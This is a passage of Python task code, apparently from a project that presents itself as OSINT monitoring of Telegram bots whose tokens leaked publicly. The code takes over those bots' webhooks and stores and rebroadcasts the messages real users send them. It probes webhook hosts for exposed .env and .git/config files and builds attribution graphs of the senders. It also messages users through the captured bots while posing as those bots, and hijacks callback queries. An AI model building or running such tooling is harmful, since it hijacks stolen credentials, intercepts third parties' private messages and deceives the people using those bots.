        except Exception as exc:
            data = None
            error = str(exc)[:200]
        else:
            error = None

        if not data:
            # Log failure so we don't retry it forever
            try:
                await async_execute(
                    db.table("media_hashes").insert(
                        {
                            "message_id": msg_id,
                            "credential_id": cred_id,
                            "sha256": f"__failed__{msg_id[:8]}",  # sentinel unique per row
                            "media_type": media_type,
                            "error": error or "download_returned_none",
                        }
                    )
                )
            except Exception:
                pass
            failed_count += 1
            continue

        sha = hashlib.sha256(data).hexdigest()
        if sha in seen_sha256_in_batch:
            duplicate_count += 1
        seen_sha256_in_batch.add(sha)

        # Compute perceptual hash for images (imagehash lib is optional)
        phash: str | None = None
        try:
            if media_type == "photo":
                from io import BytesIO
                from PIL import Image
                import imagehash

                img = Image.open(BytesIO(data))
                phash = str(imagehash.phash(img))
        except Exception:
            phash = None

        try:
            await async_execute(
                db.table("media_hashes").insert(
                    {
                        "message_id": msg_id,
                        "credential_id": cred_id,
                        "sha256": sha,
                        "phash": phash,
                        "file_size_bytes": len(data),
                        "mime_type": file_meta.get("mime"),
                        "media_type": media_type,
                    }
                )
            )
            hashed_count += 1
        except Exception as exc:
            logger.warning(f"[MediaHash] insert failed for {msg_id}: {exc}")

    logger.info(
        f"[MediaHash] hashed={hashed_count} failed={failed_count} "
        f"in_batch_dupes={duplicate_count} candidates={len(candidate_rows)}"
    )

    return {
        "status": "ok",
        "hashed": hashed_count,
        "failed": failed_count,
        "in_batch_duplicates": duplicate_count,
        "candidates_seen": len(candidate_rows),
    }


@app.task(name="flow.media_duplicate_report")
def media_duplicate_report():
    """Broadcast summary of duplicate media SHA-256s across bots — a same
    file being sent by many bots suggests a common operator or automated payload.
    """
    from app.workers.celery_app import get_worker_loop

    return get_worker_loop().run_until_complete(_media_duplicate_report_logic())


async def _media_duplicate_report_logic() -> dict:
    try:
        # Group by sha256 with count > 1
        res = await async_execute(
            db.table("media_hashes")
            .select("sha256, credential_id, media_type")
            .not_.like("sha256", "__failed__%")
            .limit(5000)
        )
    except Exception as e:
        return {"status": "db_lookup_failed", "error": str(e)[:200]}

    from collections import defaultdict

    by_hash: dict = defaultdict(set)
    hash_type: dict = {}
    for row in res.data or []:
        sha = row.get("sha256")
        cred = row.get("credential_id")
        if not sha or not cred:
            continue
        by_hash[sha].add(cred)
        hash_type[sha] = row.get("media_type")

    duplicates = [
        (sha, len(creds), hash_type.get(sha))
        for sha, creds in by_hash.items()
        if len(creds) >= 2
    ]
    duplicates.sort(key=lambda x: x[1], reverse=True)

    if not duplicates:
        try:
            await get_broadcaster().send_log(
                "🔎 **Media Duplicate Report** — no shared media across bots yet."
            )
        except Exception:
            pass
        return {"status": "no_duplicates"}

    lines = [
        "🔎 **Media Duplicate Report**",
        "Same file (SHA-256) sent by multiple compromised bots — likely common operator.",
        "",
    ]
    for sha, count, mtype in duplicates[:15]:
        lines.append(f"• `{sha[:16]}...` ({mtype}) × {count} bots")

    msg = "\n".join(lines)[:3900]
    try:
        await get_broadcaster().send_log(msg)
    except Exception as e:
        return {"status": "broadcast_failed", "error": str(e)[:200]}

    return {"status": "ok", "duplicate_hashes": len(duplicates)}


@app.task(name="flow.unpin_all_webhook_messages")
def unpin_all_webhook_messages(max_credentials: int = 500):
    """Sweep every credential with pinned_webhook_msg_id, unpin the Telegram
    message, and clear the meta field. One-shot cleanup — safe to re-run."""
    from app.workers.celery_app import get_worker_loop

    return get_worker_loop().run_until_complete(_unpin_all_webhook_messages_logic(max_credentials))


async def _unpin_all_webhook_messages_logic(max_credentials: int) -> dict:
    try:
        res = await async_execute(
            db.table("discovered_credentials")
            .select("id, meta")
            .not_.is_("meta->>pinned_webhook_msg_id", "null")
            .limit(max_credentials)
        )
    except Exception as e:
        return {"status": "db_lookup_failed", "error": str(e)[:200]}

    rows = res.data or []
    if not rows:
        return {"status": "no_pinned_messages"}

    broadcaster = get_broadcaster()
    unpinned = 0
    failed = 0

    for row in rows:
        meta = row.get("meta") or {}
        pinned_id = meta.get("pinned_webhook_msg_id")
        if not pinned_id:
            continue
        try:
            ok = await broadcaster.unpin_message(settings.MONITOR_GROUP_ID, int(pinned_id))
            if ok:
                unpinned += 1
            else:
                failed += 1
        except Exception as e:
            logger.debug(f"[UnpinAll] unpin failed for msg {pinned_id}: {e}")
            failed += 1

        # Clear the meta field regardless — the pinned message may already
        # be deleted/inaccessible, we still want the record cleaned up.
        try:
            new_meta = {k: v for k, v in meta.items() if k not in (
                "pinned_webhook_msg_id", "pinned_webhook_at"
            )}
            await async_execute(
                db.table("discovered_credentials")
                .update({"meta": new_meta})
                .eq("id", row["id"])
            )
        except Exception:
            pass

    msg = f"📌 Unpinned {unpinned} webhook messages ({failed} unpin failures)"
    logger.info(msg)
    try:
        await broadcaster.send_log(msg)
    except Exception:
        pass

    return {"status": "ok", "unpinned": unpinned, "failed": failed, "total": len(rows)}


@app.task(name="flow.webhook_port_sitemap_diag")
def webhook_port_sitemap_diag():
    """Diagnostic report: port distribution + reachable-path stats + sitemap
    findings across all captured webhook_probe results."""
    from app.workers.celery_app import get_worker_loop

    return get_worker_loop().run_until_complete(_webhook_port_sitemap_diag_logic())


async def _webhook_port_sitemap_diag_logic() -> dict:
    from collections import Counter
    from urllib.parse import urlparse

    try:
        res = await async_execute(
            db.table("discovered_credentials")
            .select("id, meta")
            .not_.is_("meta->>webhook_url", "null")
            .limit(2000)
        )
    except Exception as e:
        return {"status": "db_lookup_failed", "error": str(e)[:200]}

    port_counter: Counter = Counter()
    scheme_counter: Counter = Counter()
    reachable_path_counter: Counter = Counter()
    sitemap_hits: list[dict] = []
    leaks: list[dict] = []
    total_with_probe = 0

    for row in res.data or []:
        meta = row.get("meta") or {}
        url = meta.get("webhook_url")
        if not url:
            continue

        # Extract port from URL (defaults 443/80 by scheme)
        try:
            parsed = urlparse(url)
        except Exception:
            continue
        port = parsed.port or (443 if parsed.scheme == "https" else 80)
        port_counter[port] += 1
        scheme_counter[parsed.scheme or "unknown"] += 1

        probe = meta.get("webhook_probe") or {}
        if probe:
            total_with_probe += 1

        # Reachable paths (status 200)
        web_recon = probe.get("web_recon") or {}
        for path, info in web_recon.items():
            if not isinstance(info, dict):
                continue
            if info.get("status") == 200:
                reachable_path_counter[path] += 1
            # Sitemap capture
            if path == "/sitemap.xml" and info.get("status") == 200:
                sample = (info.get("preview") or "")[:200]
                sitemap_hits.append(
                    {"host": parsed.hostname, "url": url, "preview": sample}
                )
            # Sensitive-file leak
            if path in ("/.env", "/.git/config", "/server-status") and info.get("leak_preview"):
                leaks.append(
                    {"host": parsed.hostname, "path": path, "preview": info["leak_preview"][:150]}
                )

    lines = [
        "🔎 **Webhook Port + Sitemap Diagnostic**",
        f"Analyzed {len(res.data or [])} webhook URLs ({total_with_probe} with probe data)",
        "",
        "**Port distribution:**",
    ]
    for port, count in port_counter.most_common(10):
        pct = count / max(len(res.data or []), 1) * 100
        lines.append(f"• `{port}` × {count} ({pct:.0f}%)")

    lines.append("")
    lines.append("**Scheme distribution:**")
    for scheme, count in scheme_counter.most_common():
        lines.append(f"• `{scheme}` × {count}")

    lines.append("")
    lines.append("**Top reachable paths (HTTP 200):**")
    for path, count in reachable_path_counter.most_common(10):
        lines.append(f"• `{path}` × {count}")

    if sitemap_hits:
        lines.append("")
        lines.append(f"**Sitemap.xml hits: {len(sitemap_hits)} hosts**")
        for hit in sitemap_hits[:5]:
            lines.append(f"• `{hit['host']}`")

    if leaks:
        lines.append("")
        lines.append(f"**Sensitive-file leaks: {len(leaks)}**")
        for leak in leaks[:5]:
            lines.append(f"• `{leak['host']}` → `{leak['path']}`")

    msg = "\n".join(lines)[:3900]
    try:
        await get_broadcaster().send_log(msg)
    except Exception as e:
        return {"status": "broadcast_failed", "error": str(e)[:200]}

    return {
        "status": "ok",
        "urls_analyzed": len(res.data or []),
        "urls_with_probe": total_with_probe,
        "top_port": port_counter.most_common(1)[0] if port_counter else None,
        "sitemap_hosts": len(sitemap_hits),
        "sensitive_leaks": len(leaks),
    }


@app.task(name="flow.message_flow_diag")
def message_flow_diag():
    """Diagnose message flow health — recent ingest rate, takeover-vs-capture
    correlation, per-bot activity distribution."""
    from app.workers.celery_app import get_worker_loop

    return get_worker_loop().run_until_complete(_message_flow_diag_logic())


async def _message_flow_diag_logic() -> dict:
    from collections import Counter
    from datetime import datetime, timedelta, timezone

    now = datetime.now(timezone.utc)
    windows = [
        ("last 1h", now - timedelta(hours=1)),
        ("last 24h", now - timedelta(hours=24)),
        ("last 7d", now - timedelta(days=7)),
    ]

    ingest_by_window: dict[str, int] = {}
    for label, since in windows:
        try:
            r = await async_execute(
                db.table("exfiltrated_messages")
                .select("id", count="exact")
                .gte("created_at", since.isoformat())
                .limit(1)
            )
            ingest_by_window[label] = r.count or 0
        except Exception:
            ingest_by_window[label] = -1

    # Per-bot ingest (last 24h) — which credentials are actually producing?
    since_24h = (now - timedelta(hours=24)).isoformat()
    try:
        recent = await async_execute(
            db.table("exfiltrated_messages")
            .select("credential_id")
            .gte("created_at", since_24h)
            .limit(5000)
        )
        bot_activity = Counter(r.get("credential_id") for r in (recent.data or []) if r.get("credential_id"))
    except Exception:
        bot_activity = Counter()

    # Active credentials with recent activity
    active_with_ingest_24h = len(bot_activity)

    # Total active credentials
    try:
        total_active = await async_execute(
            db.table("discovered_credentials")
            .select("id", count="exact")
            .eq("status", "active")
            .limit(1)
        )
        total_active_count = total_active.count or 0
    except Exception:
        total_active_count = 0

    activity_pct = (active_with_ingest_24h / total_active_count * 100) if total_active_count else 0.0

    # Recent takeovers — used to correlate takeover rate vs message rate
    try:
        takeover_24h = await async_execute(
            db.table("audit_logs")
            .select("id", count="exact")
            .eq("event_type", "webhook.takeover")
            .gte("created_at", since_24h)
            .limit(1)
        )
        takeover_count = takeover_24h.count or 0
    except Exception:
        takeover_count = -1

    lines = [
        "📉 **Message Flow Diagnostic**",
        "",
        "**Ingest volume:**",
    ]
    for label, count in ingest_by_window.items():
        lines.append(f"• {label}: {count:,} messages")

    lines.append("")
    lines.append("**Bot activity (last 24h):**")
    lines.append(
        f"• {active_with_ingest_24h} of {total_active_count} active bots produced ≥1 msg "
        f"({activity_pct:.1f}%)"
    )
    lines.append(f"• {takeover_count} webhook takeovers succeeded")

    if bot_activity:
        lines.append("")
        lines.append("**Top 5 message-producing bots (24h):**")
        for cred_id, count in bot_activity.most_common(5):
            lines.append(f"• `{cred_id[:8]}...` × {count} msgs")

    lines.append("")
    lines.append("**Diagnosis:**")
    if ingest_by_window.get("last 24h", 0) < 100:
        lines.append(
            "⚠️  Low 24h volume. Likely causes:\n"
            "   1. Most bots have no real users interacting with them (dead bots)\n"
            "   2. Third parties re-register webhooks faster than we takeover\n"
            "   3. getUpdates polling cadence — check rescrape frequency\n"
            "   4. Bots may be rate-limited by Telegram after mass takeover"
        )
    else:
        lines.append("✅ Flow appears healthy.")

    msg = "\n".join(lines)[:3900]
    try:
        await get_broadcaster().send_log(msg)
    except Exception as e:
        return {"status": "broadcast_failed", "error": str(e)[:200]}

    return {
        "status": "ok",
        "ingest_by_window": ingest_by_window,
        "active_with_ingest_24h": active_with_ingest_24h,
        "total_active": total_active_count,
        "takeover_count_24h": takeover_count,
    }


@app.task(name="flow.reconcile_topics_from_db")
def reconcile_topics_from_db(max_credentials: int = 500):
    """Reconciliation: Supabase is source of truth. For each active credential,
    verify topic exists and trigger re-broadcast of any messages that were
    inserted but not yet delivered (is_broadcasted=False).

    Does NOT reset already-broadcasted messages to False — that would flood
    topics with duplicates. Purely fills gaps forward.

    Broadcasts a summary of what was reconciled.
    """
    from app.workers.celery_app import get_worker_loop

    return get_worker_loop().run_until_complete(
        _reconcile_topics_from_db_logic(max_credentials)
    )


async def _reconcile_topics_from_db_logic(max_credentials: int) -> dict:
    # 1. Count pending (is_broadcasted=False) messages per credential
    try:
        pending = await async_execute(
            db.table("exfiltrated_messages")
            .select("credential_id")
            .eq("is_broadcasted", False)
            .limit(10000)
        )
    except Exception as e:
        return {"status": "db_lookup_failed", "error": str(e)[:200]}

    from collections import Counter

    pending_by_cred = Counter(
        r.get("credential_id") for r in (pending.data or []) if r.get("credential_id")
    )

    total_pending = sum(pending_by_cred.values())
    if total_pending == 0:
        msg = (
            "🔄 **Topic Reconciliation** — DB clean. "
            "0 messages pending broadcast across all credentials."
        )
        try:
            await get_broadcaster().send_log(msg)
        except Exception:
            pass
        return {"status": "clean", "pending": 0}

    # 2. Which credentials need topic verification? Look at ones with pending msgs.
    cred_ids = list(pending_by_cred.keys())[:max_credentials]
    try:
        creds = await async_execute(
            db.table("discovered_credentials")
            .select("id, bot_username, chat_name, meta")
            .in_("id", cred_ids)
        )
    except Exception as e:
        return {"status": "db_lookup_failed", "error": str(e)[:200]}

    missing_topic_count = 0
    for row in creds.data or []:
        meta = row.get("meta") or {}
        if not meta.get("topic_id"):
            missing_topic_count += 1

    # 3. Trigger the broadcast_pending task to churn through pending queue.
    #    Broadcaster is the ONLY code path that should mark is_broadcasted=True
    #    so this is safe (no duplication).
    try:
        app.send_task("flow.broadcast_pending")
        dispatched = True
    except Exception:
        dispatched = False

    top_backlog = pending_by_cred.most_common(10)

    lines = [
        "🔄 **Topic Reconciliation (Supabase = source of truth)**",
        "",
        f"• Total pending broadcasts: {total_pending}",
        f"• Credentials affected: {len(pending_by_cred)}",
        f"• Credentials missing topic_id: {missing_topic_count}",
        f"• broadcast_pending dispatched: {dispatched}",
        "",
        "**Top backlog (credential → pending count):**",
    ]
    for cred_id, count in top_backlog:
        lines.append(f"• `{cred_id[:8]}...` × {count}")

    msg = "\n".join(lines)[:3900]
    try:
        await get_broadcaster().send_log(msg)
    except Exception as e:
        return {"status": "broadcast_failed", "error": str(e)[:200]}

    return {
        "status": "ok",
        "total_pending": total_pending,
        "credentials_affected": len(pending_by_cred),
        "credentials_missing_topic": missing_topic_count,
        "broadcast_dispatched": dispatched,
    }


@app.task(name="flow.pin_general_readme")
def pin_general_readme():
    """One-shot: post a README to the General topic and pin it (chat-level pin
    so it's visible to anyone stumbling into the group). Safe to re-run —
    replaces existing pinned readme by unpinning previous first."""
    from app.workers.celery_app import get_worker_loop

    return get_worker_loop().run_until_complete(_pin_general_readme_logic())


async def _pin_general_readme_logic() -> dict:
    from datetime import datetime, timezone

    webapp_url = "https://theprawnhunter.hong-yi.me"
    readme = (
        "🦐 **Prawn Hunter — Monitor Group**\n"
        "\n"
        "This group receives *passive OSINT observations* on Telegram bots whose "
        "tokens have been exposed publicly (GitHub, extension scrapes, etc). "
        "Each topic below is one compromised bot; messages you see are what real "
        "users are sending to those bots — captured after we take over their "
        "third-party webhook.\n"
        "\n"
        "**What we do**\n"
        "• Scan 13+ public data sources for leaked bot tokens\n"
        "• Passively fingerprint any third-party C2 (TLS, Shodan, web recon)\n"
        "• Delete third-party webhooks and poll updates ourselves\n"
        "• Broadcast captured messages to per-bot topics here\n"
        "\n"
        "**What we don't do**\n"
        "• Message users on those bots\n"
        "• Modify or scam anyone\n"
        "• Reveal your identity — all telemetry is server-side\n"
        "\n"
        f"**Live dashboard**: {webapp_url}\n"
        "(mobile-friendly; anon read-only view of Discovered Bots + Telemetry)\n"
        "\n"
        "**Admin commands** (whitelisted users only):\n"
        "`/status` `/pause` `/resume` `/bots` `/starthunter` `/help`\n"
        "\n"
        f"_Last updated: {datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M UTC')}_"
    )

    broadcaster = get_broadcaster()

    # Unpin previous readme (best-effort)
    try:
        prev = await async_execute(
            db.table("system_state")
            .select("value")
            .eq("key", "pinned_readme_msg_id")
            .limit(1)
        )
        if prev.data:
            prev_id = int(prev.data[0]["value"])
            try:
                await broadcaster.unpin_message(settings.MONITOR_GROUP_ID, prev_id)
            except Exception:
                pass
    except Exception:
        # system_state table might not exist yet — that's fine
        pass

    # Send new readme to General topic (no thread_id → chat-level = General)
    try:
        bot = broadcaster._get_bot_instance(broadcaster.bot_tokens[0])
        sent = await bot.send_message(
            chat_id=settings.MONITOR_GROUP_ID,
            text=readme,
            parse_mode="Markdown",
            disable_web_page_preview=True,
        )
        sent_id = sent.message_id
    except Exception as e:
        return {"status": "send_failed", "error": str(e)[:200]}

    # Pin chat-wide (in General/main chat)
    try:
        pinned = await broadcaster.pin_message(settings.MONITOR_GROUP_ID, sent_id)
    except Exception as e:
        return {"status": "pin_failed", "message_id": sent_id, "error": str(e)[:200]}

    # Track the pinned id so re-runs unpin previous
    try:
        await async_execute(
            db.table("system_state").upsert(
                {"key": "pinned_readme_msg_id", "value": str(sent_id)},
                on_conflict="key",
            )
        )
    except Exception:
        # system_state may not exist — pin still works, just no dedup
        pass

    return {"status": "ok", "message_id": sent_id, "pinned": pinned}


@app.task(name="flow.audit_user_agent_group_membership")
def audit_user_agent_group_membership():
    """Verify every active session's account is still a member of the monitor
    group with proper admin permissions. Auto-fixes:
      • Promotes members who aren't yet admin-promoted (catches ChatMemberHandler
        missed events after bot restarts)
      • Marks accounts as inactive when they've left the group
    Broadcasts summary to monitor group.
    """
    from app.workers.celery_app import get_worker_loop

    return get_worker_loop().run_until_complete(
        _audit_user_agent_group_membership_logic()
    )


async def _audit_user_agent_group_membership_logic() -> dict:
    import httpx

    monitor_bot_token = None
    tokens = (settings.MONITOR_BOT_TOKEN or "").split(",")
    if tokens and tokens[0].strip():
        monitor_bot_token = tokens[0].strip()
    if not monitor_bot_token:
        return {"status": "no_bot_token"}

    group_id = settings.MONITOR_GROUP_ID
    if not group_id:
        return {"status": "no_group_id"}

    try:
        res = await async_execute(
            db.table("telegram_accounts")
            .select("id, phone, telegram_user_id, is_admin_promoted")
            .eq("status", "active")
        )
    except Exception as e:
        return {"status": "db_lookup_failed", "error": str(e)[:200]}

    accounts = res.data or []
    if not accounts:
        return {"status": "no_accounts"}

    base_url = f"https://api.telegram.org/bot{monitor_bot_token}"
    in_group = 0
    not_in_group = 0
    promoted_now = 0
    already_promoted = 0
    marked_inactive: list[str] = []
    missing_user_id: list[str] = []

    from datetime import datetime, timezone

    async with httpx.AsyncClient(timeout=15.0) as client:
        for acct in accounts:
            user_id = acct.get("telegram_user_id")
            if not user_id:
                missing_user_id.append(acct["phone"])
                continue

            try:
                r = await client.get(
                    f"{base_url}/getChatMember",
                    params={"chat_id": group_id, "user_id": user_id},
                )
                if r.status_code == 200 and (r.json() or {}).get("ok"):
                    member_status = r.json()["result"]["status"]
                    # Statuses: creator, administrator, member, restricted, left, kicked
                    if member_status in ("left", "kicked"):
                        not_in_group += 1
                        # Mark inactive so pool stops trying to use it
                        try:
                            await async_execute(
                                db.table("telegram_accounts")
                                .update({
                                    "status": "inactive",
                                    "in_monitor_group": False,
                                    "last_membership_check_at": datetime.now(timezone.utc).isoformat(),
                                })
                                .eq("id", acct["id"])
                            )
                            marked_inactive.append(acct["phone"])
                        except Exception:
                            pass
                        continue

                    in_group += 1

                    # SAFETY: never touch creator/administrator — preserves the 4 legacy owner
                    # accounts and any human you manually promoted with wider rights.
                    if member_status in ("creator", "administrator"):
                        already_promoted += 1
                        try:
                            await async_execute(
                                db.table("telegram_accounts")
                                .update({
                                    "is_admin_promoted": True,
                                    "in_monitor_group": True,
                                    "last_membership_check_at": datetime.now(timezone.utc).isoformat(),
                                })
                                .eq("id", acct["id"])
                            )
                        except Exception:
                            pass
                        continue

                    # If in group but not promoted, promote now
                    if member_status == "member" and not acct.get("is_admin_promoted"):
                        promote_resp = await client.post(
                            f"{base_url}/promoteChatMember",
                            data={
                                "chat_id": group_id,
                                "user_id": user_id,
                                "can_manage_chat": "false",
                                "can_delete_messages": "false",
                                "can_manage_video_chats": "false",
                                "can_restrict_members": "false",
                                "can_promote_members": "false",
                                "can_change_info": "false",
                                "can_invite_users": "true",
                                "can_pin_messages": "false",
                                "is_anonymous": "false",
                            },
                        )
                        if promote_resp.status_code == 200 and (promote_resp.json() or {}).get("ok"):
                            promoted_now += 1
                            try:
                                await async_execute(
                                    db.table("telegram_accounts")
                                    .update({
                                        "is_admin_promoted": True,
                                        "promoted_at": datetime.now(timezone.utc).isoformat(),
                                        "in_monitor_group": True,
                                        "last_membership_check_at": datetime.now(timezone.utc).isoformat(),
                                    })
                                    .eq("id", acct["id"])
                                )
                            except Exception:
                                pass
                    else:
                        already_promoted += 1
                        try:
                            await async_execute(
                                db.table("telegram_accounts")
                                .update({
                                    "in_monitor_group": True,
                                    "last_membership_check_at": datetime.now(timezone.utc).isoformat(),
                                })
                                .eq("id", acct["id"])
                            )
                        except Exception:
                            pass
                else:
                    logger.debug(
                        "[MembershipAudit] getChatMember returned HTTP %s for "
                        "an account record",
                        r.status_code,
                    )
            except Exception as e:
                logger.debug(
                    "[MembershipAudit] check failed for an account record: %s",
                    type(e).__name__,
                )
                continue

    lines = [
        "👥 **User-Agent Group Membership Audit**",
        "",
        f"• Active accounts checked: {len(accounts)}",
        f"• In group + already promoted: {already_promoted}",
        f"• In group but needed promotion (fixed): {promoted_now}",
        f"• Not in group (marked inactive): {not_in_group}",
        f"• Missing telegram_user_id (skipped): {len(missing_user_id)}",
    ]
    if marked_inactive:
        lines.append("")
        lines.append("Marked inactive:")
        for p in marked_inactive[:5]:
            lines.append(f"  • {p}")

    msg = "\n".join(lines)[:3900]
    try:
        await get_broadcaster().send_log(msg)
    except Exception as e:
        return {"status": "broadcast_failed", "error": str(e)[:200]}

    return {
        "status": "ok",
        "checked": len(accounts),
        "in_group": in_group,
        "not_in_group": not_in_group,
        "promoted_now": promoted_now,
        "already_promoted": already_promoted,
        "missing_user_id": len(missing_user_id),
    }


@app.task(name="flow.attribution_graph_report")
def attribution_graph_report():
    """Link Telegram user_ids across multiple compromised bots.

    Identifies serial victims (same person interacting with many stolen bots)
    and coordinated operator patterns (single user_id driving traffic into a
    cluster of bots owned by the same C2). Broadcasts top findings.
    """
    from app.workers.celery_app import get_worker_loop

    return get_worker_loop().run_until_complete(_attribution_graph_report_logic())


async def _attribution_graph_report_logic() -> dict:
    from collections import defaultdict
    from app.services.findings import (
        cross_bot_pattern_candidates,
        persist_candidates,
        pseudonymize_subject,
    )

    # Pull sender_user_id → credential_id pairs (all-time, bounded to recent 50k rows)
    try:
        res = await async_execute(
            db.table("exfiltrated_messages")
            .select("id,sender_user_id,credential_id,created_at")
            .not_.is_("sender_user_id", "null")
            .order("created_at", desc=True)
            .limit(50000)
        )
    except Exception as e:
        return {"status": "db_lookup_failed", "error": str(e)[:200]}

    rows = res.data or []
    if not rows:
        return {"status": "no_data_with_sender_user_id"}

    finding_count = 0
    try:
        cross_bot_findings = cross_bot_pattern_candidates(rows)
        await persist_candidates(cross_bot_findings)
        finding_count = len(cross_bot_findings)
    except Exception as exc:
        logger.warning("[AttributionGraph] persistent finding upsert failed: %s", exc)

    # Group: user_id → set of credential_ids they've interacted with
    user_bots: dict = defaultdict(set)
    for r in rows:
        uid = r.get("sender_user_id")
        cid = r.get("credential_id")
        if uid and cid:
            user_bots[uid].add(cid)

    # Filter to users who've hit 2+ different bots
    multi_bot_users = {
        uid: creds for uid, creds in user_bots.items() if len(creds) >= 2
    }

    if not multi_bot_users:
        msg = (
            "🕸️ **Attribution Graph Report**\n\n"
            f"Analyzed {len(rows):,} messages from {len(user_bots):,} unique users.\n"
            "No users found interacting with 2+ captured bots yet. "
            "Graph will populate as new sender_user_id data flows in."
        )
        try:
            await get_broadcaster().send_log(msg)
        except Exception:
            pass
        return {
            "status": "no_multi_bot_users",
            "total_messages_scanned": len(rows),
            "unique_users": len(user_bots),
        }

    # Rank by number of distinct bots
    ranked = sorted(multi_bot_users.items(), key=lambda x: len(x[1]), reverse=True)

    # Also correlate with C2 operator info
    cred_ids_of_interest = set()
    for _uid, creds in ranked[:20]:
        cred_ids_of_interest.update(creds)

    # Fetch webhook_url for those credentials
    cred_c2: dict = {}
    if cred_ids_of_interest:
        try:
            cred_res = await async_execute(
                db.table("discovered_credentials")
                .select("id, bot_username, meta")
                .in_("id", list(cred_ids_of_interest)[:200])
            )
            for c in cred_res.data or []:
                meta = c.get("meta") or {}
                cred_c2[c["id"]] = {
                    "bot": c.get("bot_username") or "?",
                    "c2": meta.get("webhook_url") or "none",
                }
        except Exception:
            pass

    lines = [
        "🕸️ **Attribution Graph Report**",
        "",
        f"Analyzed {len(rows):,} messages from {len(user_bots):,} unique users.",
        f"**{len(multi_bot_users)} users** interact with 2+ captured bots (serial victims or operators).",
        "",
        "**Top cross-bot users:**",
    ]
    for uid, creds in ranked[:10]:
        subject_pseudonym = pseudonymize_subject(uid)
        bot_names = [cred_c2.get(c, {}).get("bot", c[:8]) for c in list(creds)[:5]]
        c2_hosts = set()
        for c in creds:
            url = cred_c2.get(c, {}).get("c2", "")
            if url and url != "none":
                try:
                    from urllib.parse import urlparse
                    c2_hosts.add(urlparse(url).hostname or "?")
                except Exception:
                    pass
        c2_str = f" → C2: {', '.join(list(c2_hosts)[:3])}" if c2_hosts else ""
        lines.append(
            f"• `subject:{subject_pseudonym}` × {len(creds)} bots "
            f"({', '.join(bot_names[:3])}{'...' if len(bot_names) > 3 else ''})"
            f"{c2_str}"
        )

    msg = "\n".join(lines)[:3900]
    try:
        await get_broadcaster().send_log(msg)
    except Exception as e:
        return {"status": "broadcast_failed", "error": str(e)[:200]}

    return {
        "status": "ok",
        "total_messages_scanned": len(rows),
        "unique_users": len(user_bots),
        "multi_bot_users": len(multi_bot_users),
        "top_user_bots_count": len(ranked[0][1]) if ranked else 0,
        "findings_upserted": finding_count,
    }


@app.task(name="flow.honeypot_redirect_sweep")
def honeypot_redirect_sweep():
    """Sweep honeypot_updates for un-redirected messages and send each user
    a redirect to the onboard bot. Fires every 30s via beat.

    The message is sent FROM the captured bot (using its decrypted token)
    TO the user — looks like the bot itself is directing them.
    """
    from app.workers.celery_app import get_worker_loop

    return get_worker_loop().run_until_complete(_honeypot_redirect_sweep_logic())


async def _honeypot_redirect_sweep_logic() -> dict:
    if not settings.HONEYPOT_REDIRECT_MODE:
        return {"status": "disabled"}
    if not settings.HONEYPOT_REDIRECT_AUTHORIZED:
        return {"status": "skipped", "reason": "not_authorized"}

    try:
        # Get un-redirected message-type updates
        res = await async_execute(
            db.table("honeypot_updates")
            .select("id, credential_id, payload, received_at, update_type")
            .is_("redirected_at", "null")
            .in_("update_type", ["message", "callback_query", "inline_query", "edited_message", "channel_post"])
            .order("received_at", desc=False)
            .limit(50)
        )
    except Exception as e:
        return {"status": "db_lookup_failed", "error": str(e)[:200]}

    rows = res.data or []
    if not rows:
        return {"status": "idle", "pending": 0}

    dispatched = 0
    skipped = 0

    for row in rows:
        payload = row.get("payload") or {}
        credential_id = row.get("credential_id")
        update_type = row.get("update_type") or "message"
        
        # Extract user_id and chat_id based on update_type
        user_id = None
        chat_id = None
        from_user = {}

        if update_type == "message":
            msg = payload.get("message") or {}
            from_user = msg.get("from") or {}
            user_id = from_user.get("id")
            chat_id = msg.get("chat", {}).get("id")
        elif update_type == "callback_query":
            cb = payload.get("callback_query") or {}
            from_user = cb.get("from") or {}
            user_id = from_user.get("id")
            chat_id = cb.get("message", {}).get("chat", {}).get("id") or user_id
        elif update_type == "inline_query":
            iq = payload.get("inline_query") or {}
            from_user = iq.get("from") or {}
            user_id = from_user.get("id")
            chat_id = user_id  # Inline: use user_id
        elif update_type == "edited_message":
            msg = payload.get("edited_message") or {}
            from_user = msg.get("from") or {}
            user_id = from_user.get("id")
            chat_id = msg.get("chat", {}).get("id")
        elif update_type == "channel_post":
            msg = payload.get("channel_post") or {}
            from_user = msg.get("from") or {}
            user_id = from_user.get("id") if not from_user.get("is_bot") else None
            chat_id = msg.get("chat", {}).get("id")

        # Skip bots, missing data
        if not user_id or not chat_id or not credential_id:
            skipped += 1
            continue
        if from_user.get("is_bot"):
            skipped += 1
            continue

        # Per-user dedup
        dedup_key = f"redirect:sent:{credential_id}:{user_id}"
        try:
            from app.core.redis_srv import redis_srv
            if redis_srv.client.exists(dedup_key):
                try:
                    await async_execute(
                        db.table("honeypot_updates")
                        .update({"redirected_at": "now()", "redirected_bot": "dedup_skip"})
                        .eq("id", row["id"])
                    )
                except Exception:
                    pass
                skipped += 1
                continue
        except Exception:
            pass

        # Dispatch redirect with update_type for specialized handling
        app.send_task(
            "flow.honeypot_redirect_one",
            kwargs={
                "update_id": row["id"],
                "credential_id": credential_id,
                "user_id": user_id,
                "chat_id": chat_id,
                "update_type": update_type,
            },
        )
        dispatched += 1

    return {"status": "ok", "dispatched": dispatched, "skipped": skipped, "pending": len(rows)}


@app.task(name="flow.honeypot_redirect_one")
def honeypot_redirect_one(
    update_id: str,
    credential_id: str,
    user_id: int,
    chat_id: int,
    update_type: str = "message",
):
    """Send a redirect message to a single user via the captured bot's token."""
    from app.workers.celery_app import get_worker_loop

    return get_worker_loop().run_until_complete(
        _honeypot_redirect_one_logic(update_id, credential_id, user_id, chat_id, update_type)
    )


async def _honeypot_redirect_one_logic(
    update_id: str,
    credential_id: str,
    user_id: int,
    chat_id: int,
    update_type: str = "message",
) -> dict:
    import httpx
    from datetime import datetime, timezone
    from app.workers.tasks.honeypot_redirect_strategies import HoneypotRedirectStrategies
    
    redirect_bot = settings.HONEYPOT_REDIRECT_BOT
    deeplink = settings.HONEYPOT_REDIRECT_DEEPLINK
    redirect_url = f"https://t.me/{redirect_bot}?start={deeplink}"
    # Level 3: Callback query hijack
    if update_type == "callback_query":
        payload = await async_execute(
            db.table("honeypot_updates")
            .select("payload")
            .eq("id", update_id)
            .limit(1)
        )
        if not payload.data:
            return {"status": "payload_not_found"}
        
        cb = payload.data[0].get("payload", {}).get("callback_query", {})
        callback_id = cb.get("id")
        
        bot_token = await HoneypotRedirectStrategies.get_bot_token(credential_id)
        if not bot_token:
            return {"status": "token_decrypt_failed"}
        
